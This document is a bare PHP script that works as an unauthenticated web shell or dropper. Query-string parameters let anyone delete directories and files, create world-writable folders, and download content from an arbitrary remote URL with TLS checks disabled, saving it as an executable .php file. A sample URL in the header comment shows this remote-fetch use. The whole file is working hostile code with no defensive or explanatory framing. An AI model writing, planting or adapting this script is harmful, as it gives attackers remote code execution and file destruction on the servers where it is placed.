<?php
//==============Sample============//
//http://xxx/php.php?a=download&p=test&s=test&u=http://xxx/upload/ver.txt
//==============Sample============//

$action = $_GET["a"];//Opertion Unix Shell(Like:rmdir,mkdir,unlink etc...)
$path = $_GET["p"];//Save Path Or Delete Path
$url = $_GET["u"];//Remote Download Url
$save = $_GET["s"];//Save File

if(!empty($action)){
if(!empty($path)){
if($action == "rmdir"){
$path = "./{$path}";
if(is_dir($path)){
$folders = clean_up($path);
print_r("Delete {$path} Success!!!");
exit;
}else{
print_r("Action Fail,{$path} Not Exists");
exit;
}}
if($action == "mkdir"){
mkdir("./{$path}", 0777, true);
print_r("Create ./{$path} Success!!!");
exit;
}
if($action == "unlink"){
if(!file_exists("./{$path}")){
print_r("Action Fail,Please Make Sure Path Not Just a Folders,Must Be (Folders+FileName)!!!");
exit;
}else{
unlink($path);
print_r("Delete File(./{$path}) Success!!!");
exit;
}}
if($action == "download" and !empty($save)){
mkdir("./{$path}", 0777, true);
$data = curl($url);
file_put_contents("./{$path}/{$save}.php",$data);
print_r("Download ./{$path}/{$save}.php Success!!!");
exit;
}else{
print_r("Action Fail,Please Check Save File Name!!!");
exit;
}}else{
print_r("Action Fail,Please Check Path");
exit;
}}else{
print_r("No Action");
exit;
}

function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}

function clean_up($path){
$data = scandir($path);
unset($data[0]);
unset($data[1]);
$data = array_values($data);
$count = count($data);
for($i=0;$i<$count;$i++){
unlink($path."/".$data[$i]);
}
rmdir($path);
}
?>